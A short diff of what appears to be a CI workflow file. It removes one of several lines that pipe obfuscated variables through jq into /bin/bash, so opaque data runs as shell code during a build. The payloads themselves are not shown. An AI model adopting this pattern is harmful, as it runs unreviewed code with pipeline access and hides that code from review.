@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$tpq080" | jq -r .bxuyz5 | /bin/bash
           echo $md713 | jq -r .x0015 | /bin/bash
           printf '%s' "$m370" | jq -r .baqs4545 | /bin/bash
-          echo $usmuu1 | jq -r .ot2602 | /bin/bash
           echo $k00992 | jq -r .mng8 | /bin/bash
           echo $hz438 | jq -r .txpn62 | /bin/bash
 
